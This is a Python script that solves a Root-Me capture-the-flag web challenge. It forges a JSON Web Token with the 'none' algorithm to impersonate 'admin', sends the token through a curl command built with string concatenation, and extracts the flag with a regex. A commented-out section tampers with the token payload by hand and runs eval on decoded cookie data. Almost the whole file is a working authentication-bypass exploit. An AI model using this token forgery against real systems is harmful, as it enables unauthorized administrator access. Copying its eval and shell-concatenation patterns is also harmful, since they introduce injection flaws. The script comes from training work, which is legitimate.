import requests, base64, jwt, os, re


host = "http://challenge01.root-me.org/web-serveur/ch58/index.php?guest"
session = requests.session()
response = session.get(host)
response = response.text

#Recuperation du cookie
cookie = session.cookies.get_dict()
print(cookie)
cookie = cookie['jwt']
print(cookie)

new_cookie = jwt.encode({'username':'admin'},'',algorithm='none')
print(new_cookie)
print(type(new_cookie))

text = os.popen("curl -v http://challenge01.root-me.org/web-serveur/ch58/index.php?admin --header -H 'host:challenge01.root-me.org' -H 'Content-Type:application/json'  -b jwt=" + new_cookie)
text = text.read()
print(text)

#recuperation du flag

flag = re.findall("[a-zA-Z0-9_]{35}", text)

if flag:
    print(flag[0])


"""
#Changement de l'algo



#Recuperation du payload
payload = cookie.split(".")[1]
payload += "=="
# print(payload)

#Decodage du payload
decoded_payload = eval(base64.b64decode(payload).decode('ascii'))
print(decoded_payload)
print(type(decoded_payload))

#Changement de l'utilisateur
decoded_payload.update({'username':"admin"})
print(decoded_payload)

#Encodage du payload
_tmp = str(decoded_payload).encode('ascii')
payload = base64.b64encode(_tmp)
print(payload)
"""

#New payload
# new_cookie = cookie.split(".")[0]+"."+payload+"."+cookie.split(".")[2]
# print(new_cookie)

# r = requests.get(url, cookies=cookies)
# r.text
